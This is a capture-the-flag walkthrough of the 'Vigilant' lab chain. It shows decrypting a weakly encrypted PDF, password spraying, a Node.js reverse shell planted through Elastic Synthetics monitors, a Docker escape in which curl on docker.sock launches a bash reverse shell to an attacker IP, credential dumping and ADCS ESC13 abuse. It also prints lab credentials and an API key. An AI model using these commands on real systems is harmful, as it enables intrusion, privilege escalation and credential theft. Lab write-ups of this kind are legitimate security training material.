# Vigilant (chain) (hard)

## port scan

```
Open 10.10.150.246:22
Open 10.10.150.246:80
Open 10.10.150.245:88
Open 10.10.150.245:135
Open 10.10.150.245:139
Open 10.10.150.245:389
Open 10.10.150.245:445
Open 10.10.150.245:464
Open 10.10.150.245:593
Open 10.10.150.245:636
Open 10.10.150.245:3268
Open 10.10.150.245:3269
Open 10.10.150.245:3389
Open 10.10.150.245:9200
Open 10.10.150.245:9389
```

## service enumeartion

there have `ITShare` custom share folder

![](<vigilant(chain)(hard)/walkthrough_20240416093437484.png>)

we found a encrypt pdf file

![](<vigilant(chain)(hard)/walkthrough_20240416093756325.png>)

i will download all

![](<vigilant(chain)(hard)/walkthrough_20240416095257526.png>)

## decrypt pdf file

i will put ADAudit.dll into dnSpy, there have encrypt function

![](<vigilant(chain)(hard)/walkthrough_20240416095235058.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416095329912.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416095544760.png>)

those c# code will encrypt file

```c#
using System;
using System.IO;
using System.Runtime.CompilerServices;

namespace ADAuditLib
{
	// Token: 0x02000004 RID: 4
	[NullableContext(1)]
	[Nullable(0)]
	public class EncryptionHelper
	{
		// Token: 0x0600000B RID: 11 RVA: 0x000029B0 File Offset: 0x00000BB0
		private static byte[] GenerateKey(int length)
		{
			byte[] key = new byte[length];
			new Random(12345).NextBytes(key);
			return key;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000029D8 File Offset: 0x00000BD8
		private static void ShuffleBytes(ref byte[] data)
		{
			for (int i = 0; i < data.Length - 1; i += 2)
			{
				byte temp = data[i];
				data[i] = data[i + 1];
				data[i + 1] = temp;
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002A0C File Offset: 0x00000C0C
		public static void EncryptFile(string filePath)
		{
			if (!File.Exists(filePath))
			{
				throw new FileNotFoundException();
			}
			byte[] fileContent = File.ReadAllBytes(filePath);
			byte[] key = EncryptionHelper.GenerateKey(fileContent.Length);
			for (int i = 0; i < fileContent.Length; i++)
			{
				byte[] array = fileContent;
				int num = i;
				array[num] ^= key[i % key.Length];
				fileContent[i] = (byte)((int)fileContent[i] << 4 | fileContent[i] >> 4);
			}
			EncryptionHelper.ShuffleBytes(ref fileContent);
			File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(filePath), Path.GetFileNameWithoutExtension(filePath) + "_encrypted" + Path.GetExtension(filePath)), fileContent);
		}
	}
}

```

i will write a decrypt c# code, the `6951` is just pdf file length

![](<vigilant(chain)(hard)/walkthrough_20240416140911454.png>)

i will create a new decryptPDF project

![](<vigilant(chain)(hard)/walkthrough_20240416140955162.png>)

change filePath

![](<vigilant(chain)(hard)/walkthrough_20240416141104448.png>)

```csharp
using System;
using System.Text;
using System.IO;

class Program
{

	private static void ShuffleBytes(ref byte[] data)
	{
		for (int i = 0; i < data.Length - 1; i += 2)
		{
			byte temp = data[i];
			data[i] = data[i + 1];
			data[i + 1] = temp;
		}
	}
    	static void Main()
	{
		byte[] key = new byte[6951];
		new Random(12345).NextBytes(key);

		string filePath = "../../Password_Strength_Report_encrypted.pdf";
		byte[] fileContent = File.ReadAllBytes(filePath);


		ShuffleBytes(ref fileContent);

		for (int i = 0; i < fileContent.Length; i++)
		{

			byte[] array = fileContent;
			int num = i;

			fileContent[i] = (byte)((int)fileContent[i] << 4 | fileContent[i] >> 4);
			array[num] ^= key[i % key.Length];
		}

		File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(filePath), Path.GetFileNameWithoutExtension(filePath) + "_decrypted" + Path.GetExtension(filePath)), fileContent);


    }
}

```

launch!

![](<vigilant(chain)(hard)/walkthrough_20240416141211361.png>)

ok, we get decrypted password report pdf file!

![](<vigilant(chain)(hard)/walkthrough_20240416141248020.png>)

the pdf show us some cred!

![](<vigilant(chain)(hard)/walkthrough_20240416141339210.png>)

```
Pamela.Clark:Vigilant@Tech2024
Alex.Powell:Vigilant_Market2024
Edwin.Dixon:Vigilant_Finance$
Daniel.Washington:Vigilant&Strategy!
```

and a username list

![](<vigilant(chain)(hard)/walkthrough_20240416141445906.png>)

i will use kerbrute to see someone who have not change there weak password

i see `Pamela.Clark@vigilant.vl:Vigilant@Tech2024`

![](<vigilant(chain)(hard)/walkthrough_20240416142129705.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416143913778.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416144135454.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416144244949.png>)

i will create some custom wordlist try to crack

![](<vigilant(chain)(hard)/walkthrough_20240416144824935.png>)

but not luck

## ssh into srv

seems the Pamela user password expired

![](<vigilant(chain)(hard)/walkthrough_20240416142854515.png>)

i will use smbpasswd change password to `Vigilant@Tech2023`

![](<vigilant(chain)(hard)/walkthrough_20240416142955490.png>)

now i can use the new password login srv host

![](<vigilant(chain)(hard)/walkthrough_20240416143123469.png>)

there have elastic

![](<vigilant(chain)(hard)/walkthrough_20240416143756669.png>)

## bruteforce elasticsearch

`/etc/.scripts/setup.sh`

the 9200 port open on dc, elasticsearch?

![](<vigilant(chain)(hard)/walkthrough_20240416151428620.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416151549416.png>)

ok~

![](<vigilant(chain)(hard)/walkthrough_20240416151913521.png>)

and elastic EDR o_O

![](<vigilant(chain)(hard)/walkthrough_20240416153020873.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416153111074.png>)

yes, we login in with Pamela.Clark cred

![](<vigilant(chain)(hard)/walkthrough_20240416153200757.png>)

and Pamela.Clark role is `superuser`

![](<vigilant(chain)(hard)/walkthrough_20240416153854948.png>)

## abuse Synthetics monitor script

there have Synthetics periodically checks the web page

![](<vigilant(chain)(hard)/walkthrough_20240416171915883.png>)

the monitor script is `Playwright`, and the `Playwright` runs inside the Node.js, which mean we can write revershell in nodejs

but we can't add evil script on webpage

![](<vigilant(chain)(hard)/walkthrough_20240416174609123.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416174404791.png>)

maybe we must use `Synthetics CLI` ?

https://www.elastic.co/guide/en/observability/current/synthetics-command-reference.html#elastic-synthetics-command

![](<vigilant(chain)(hard)/walkthrough_20240416181416248.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416181434192.png>)

```
API key

Q2lKbTVvNEIycjl0Q0lzNWg2OEg6M09RMWNjQmJTOUNzUTVJVDNQUUxHQQ==

Use as environment variable

export SYNTHETICS_API_KEY=Q2lKbTVvNEIycjl0Q0lzNWg2OEg6M09RMWNjQmJTOUNzUTVJVDNQUUxHQQ==

Project push command

SYNTHETICS_API_KEY=Q2lKbTVvNEIycjl0Q0lzNWg2OEg6M09RMWNjQmJTOUNzUTVJVDNQUUxHQQ== npm run push

```

i will install https://github.com/elastic/synthetics

![](<vigilant(chain)(hard)/walkthrough_20240416183954937.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416184720862.png>)

the monitor ID is `da074d36-e1fe-461d-8ed7-56a00dd3b0e3`

![](<vigilant(chain)(hard)/walkthrough_20240416184850255.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416184919942.png>)

change url to `http://localhost`

![](<vigilant(chain)(hard)/walkthrough_20240416190433058.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416190501407.png>)

add our reverse shell nodejs code. And delete other example journeys. at last, push our code into elastic

```bash
npx @elastic/synthetics push --url http://dc.vigilant.vl:5601/ --auth $SYNTHETICS_API_KEY
```

![](<vigilant(chain)(hard)/walkthrough_20240416192041848.png>)

i will start journeys manually

![](<vigilant(chain)(hard)/walkthrough_20240416191846887.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416192730530.png>)

ok...we have shell!!!!

![](<vigilant(chain)(hard)/walkthrough_20240416192640457.png>)

root

![](<vigilant(chain)(hard)/walkthrough_20240416192830555.png>)

## docker break out via docker.sock

i will run ‎Deepce.sh

![](<vigilant(chain)(hard)/walkthrough_20240416200407089.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416200358599.png>)

just like hackthebox `extension` box, the `/var/run/docker.sock` writeable

first, i will list useable docker images

![](<vigilant(chain)(hard)/walkthrough_20240416201537427.png>)

```bash

curl --unix-socket /var/run/docker.sock http://localhost/images/json -s
```

![](<vigilant(chain)(hard)/walkthrough_20240416201800796.png>)

![](<vigilant(chain)(hard)/walkthrough_20240416201904711.png>)

i will create a container with reverse shell command to abuse docker.sock

```bash
cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i &>/dev/tcp/10.8.1.167/80 0>&1'\\\"\"]"

curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine:latest\",\"cmd\":$cmd,\"Binds\":[\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=peterpwn_root


curl --unix-socket /var/run/docker.sock -s -X POST http://localhost/containers/bf924e6558a15e3cd1aea7b7ee27913eeb9e4eef9a70954d17ab121bb732df90/start
```

after the containers, we can have a root reveseshell. And then, i will put my key into `/root/.ssh/authorized_keys` and dump machine hash

![](<vigilant(chain)(hard)/walkthrough_20240416210812025.png>)

![](<vigilant(chain)(hard)/walkthrough_20240417181112880.png>)

i will use linikatz, we really need some new cred

![](<vigilant(chain)(hard)/walkthrough_20240417203500808.png>)

ok!, hashcat

![](<vigilant(chain)(hard)/walkthrough_20240417203543228.png>)

## ESC13 abuse

we can use CABRIEL user cred winrm into target, and he can enroll `VIGILANTADMINS` cert tempalte

![](<vigilant(chain)(hard)/walkthrough_20240417182205404.png>)

some enumeration...

![](<vigilant(chain)(hard)/walkthrough_20240417192257430.png>)

after read some adcs attack blog, i found the `VIGILANTADMINS` may
Vulnerable to ESC13 abuse

https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53

and i will run a quick check esc13 powershell script

https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1

it say `VIGILANTADMINS` may be used to abtian `Temporary admin ` permission

![](<vigilant(chain)(hard)/walkthrough_20240417200058354.png>)

First get the certificate as usual

Then get tgt through the certificate.Please note that the tgt obtained at this time already has `Temporary admin` permissions

![](<vigilant(chain)(hard)/walkthrough_20240417201035279.png>)

use kerberos auth dump all!

![](<vigilant(chain)(hard)/walkthrough_20240417201132525.png>)

done!

![](<vigilant(chain)(hard)/walkthrough_20240417201649257.png>)
